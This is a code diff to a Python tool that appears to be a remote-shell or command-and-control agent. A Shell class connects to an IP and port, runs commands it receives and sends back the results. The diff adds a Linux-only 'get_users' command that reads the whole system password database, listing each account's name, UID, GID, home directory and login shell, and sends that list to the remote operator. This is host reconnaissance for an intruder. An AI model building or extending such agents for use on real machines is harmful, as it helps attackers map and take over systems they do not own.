@@ -4,6 +4,10 @@ import sys
 import time
 import netifaces
 
+if sys.platform.startswith('linux'):
+    # linux only
+    import pwd
+
 
 class Enumerate:
     @staticmethod
@@ -84,6 +88,20 @@ class Enumerate:
             data = "\nNo interfaces available\n"
         return data
 
+    @staticmethod
+    def get_users():
+        if sys.platform.startswith('linux'):
+            try:
+                users = ""
+                for user in pwd.getpwall():
+                    users += f"{user.pw_name}: UID: {user.pw_uid}, GID: {user.pw_gid}, Dir: {user.pw_dir}, Shell: " \
+                             f"{user.pw_shell}\n"
+            except Exception as error:
+                users = error
+        else:
+            users = "\nLinux only operation.\n"
+        return users
+
 
 class Shell(Enumerate):
     def __init__(self, ip, port, buffer):
@@ -124,6 +142,9 @@ class Shell(Enumerate):
                     self.send(result)
                 elif 'get_network' in command:
                     result = self.get_network_info()
+                    self.send(result)
+                elif 'get_users' in command:
+                    result = self.get_users()
                     self.send(result)
                 else:
                     print(command)
